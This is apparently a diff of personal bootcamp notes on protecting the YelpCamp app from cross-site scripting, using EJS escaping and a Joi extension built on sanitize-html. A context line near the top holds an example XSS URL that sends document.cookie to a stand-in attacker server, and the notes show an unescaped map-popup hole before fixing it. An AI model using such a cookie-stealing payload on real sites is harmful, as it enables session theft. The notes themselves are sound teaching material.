@@ -128,3 +128,156 @@ So if we have that script in a URL, we can shorten it so that no one sees it. Wh
 ```
 yourwebsite.com?name<script>new Image().src='mybadserver/hacker?output='+document.cookie;</script>
 ```
+
+## 3. Sanitizing HTML w/ JOI
+
+### 3.1 How EJS Prevents Embedded HTML
+
+Let's go back to a camp and see what happens if we try to inject a script or even an HTML element to start. When we edit our campground's name to have an `<h1>` tag, we will see this:
+
+![img10](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img10.jpg?raw=true)
+
+![img11](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img11.jpg?raw=true)
+
+This is not treated as HTML, and the reason for this is that in EJS, when we use the `<%= %>` syntax, this will escape HTML.
+
+```
+<h5 class="card-title"><%= campground.title %></h5>
+```
+
+When we view the page source, we see that entity codes are used
+
+```html
+<h5 class="card-title">Dusty Sands &lt;h1&gt;HI&lt;/h1&gt;</h5>
+```
+
+But there is a problem: we are still vulnerable to this issue. There is one place where our elements are treated as HTML, and that is in our campground's marker on the map
+
+![img12](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img12.jpg?raw=true)
+
+### 3.2 Using JOI to Have Safeguards
+
+#### 3.2.1 Intro
+
+Let's look at our `showPageMap.js` to see what we've done
+
+```js
+// showPageMap.js
+new mapboxgl.Marker()
+  .setLngLat(campground.geometry.coordinates)
+  .setPopup(
+    new mapboxgl.Popup({offset: 25})
+      .setHTML(
+        `<h3>${campground.title}</h3>
+        <p>${campground.location}</p>`
+      )
+  )
+  .addTo(map);
+```
+
+As you can see, we are using `.setHTML()` to embed our HTML. Remember that we have to pass our information from EJS and Node to actual JS so that we have access to `campground`. This is happening in our `show.ejs`
+
+```html
+<!-- show.ejs -->
+<script>
+  const mapToken = '<%-process.env.MAPBOX_TOKEN%>';
+  const campground = <%- JSON.stringify(campground) %>;
+</script>
+```
+
+One thing we can do to fix this is changing `<%-` to `<%=` to escape the HTML. Unfortunately that will break things. What we can do instead is make our own validations to sanitize our HTML so that users cannot include tags in their queries. 
+
+JOI allows us to create extensions which allows us to define our own methods. One function that we will make is `escapeHTML()`
+
+```js
+module.exports.reviewSchema = Joi.object({
+    review: Joi.object({
+        rating: Joi.number().required()
+            .min(1)
+            .max(5),
+        body: Joi.string().required().escapeHTML()
+    }).required()
+});
+```
+
+This is the custom function that we will use: 
+
+```js
+// schemas.js
+const extension = (joi) => ({
+    type: 'string',
+    base: joi.string(),
+    messages: {
+        'string.escapeHTML': '{{#label}} must not include HTML!'
+    },
+    rules: {
+        escapeHTML: {
+            validate(value, helpers) {
+                const clean = sanitizeHtml(value, {
+                    allowedTags: [],
+                    allowedAttributes: {},
+                });
+                if (clean !== value) return helpers.error('string.escapeHTML', { value })
+                return clean;
+            }
+        }
+    }
+});
+```
+
+#### 3.2.2 sanitize-html
+
+This function will be applicable on our string properties. We will also use a package called `sanitize-html`
+
+- https://www.npmjs.com/package/sanitize-html
+
+`sanitize-html` removes HTML tags from strings. Here's an example on how it works:
+
+```js
+> const sanitizeHTML = require('sanitize-html')
+> sanitizeHTML("<script>alert('HI')</script>")
+''
+```
+
+Inside of our `escapeHTML()` function, we are ruling out everything from our `allowedTags` and `allowedAttribute` keys
+
+```js
+// schemas.js
+validate(value, helpers) {
+    const clean = sanitizeHtml(value, {
+        allowedTags: [],
+        allowedAttributes: {},
+    });
+```
+
+To use `escapeHTML()`, we will have to use this code below so that we can apply it to all Joi objects
+
+```js
+// schemas.js
+const BaseJoi = require('joi');
+const Joi = BaseJoi.extend(extension);
+```
+
+```js
+// schemas.js
+module.exports.campgroundSchema = Joi.object({
+    campground: Joi.object({
+        title: Joi.string().required().escapeHTML(),
+        price: Joi.number().required().min(0),
+        // image: Joi.string().required(),
+        location: Joi.string().required().escapeHTML(),
+        description: Joi.string().required().escapeHTML()
+    }).required(),
+    deletedImages: Joi.array()
+});
+```
+
+So now let's see what happens when we use HTML tags on our reviews or campgrounds
+
+![img13](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img13.jpg?raw=true)
+
+![img14](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img14.jpg?raw=true)
+
+![img15](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img15.jpg?raw=true)
+
+![img16](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img16.jpg?raw=true)
